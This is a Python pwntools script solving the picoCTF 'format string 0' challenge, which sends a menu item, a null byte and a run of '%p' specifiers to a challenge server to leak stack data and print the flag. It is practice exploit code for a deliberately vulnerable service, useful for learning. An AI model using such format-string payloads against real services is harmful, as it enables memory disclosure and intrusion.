# picoCTF-format-string-0-exploit.py
# by Aidan Wech (ahwech)
# nc mimas.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "mimas.picoctf.net"
    port = 52361

    # variables
    patrickItem = "Bac0n_D3luxe"                                # menu item with shortest characters
    numOfPointers = 18                                          # minimum number of '%p' needed for exploit
    payload = flat(patrickItem, '\x00', '%p' * numOfPointers)   # add null byte in-between to pass strcmp() check

    # connect to instance and deliver payload
    p = remote(host, port)
    p.recvuntil(b'recommendation: ', timeout=1)                 # patrick burger menu
    p.sendline(payload)                                         # deliver payload
    p.recvline(timeout=1)                                       # 'Patrick is still hungry!'
    p.recvline(timeout=1)                                       # 'Try to serve him something of larger size!'
    p.recvline(timeout=1)                                       # random newline
    flag = p.recvline(timeout=1).decode('utf-8').rstrip('\n')   # obtain flag
    p.close()

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()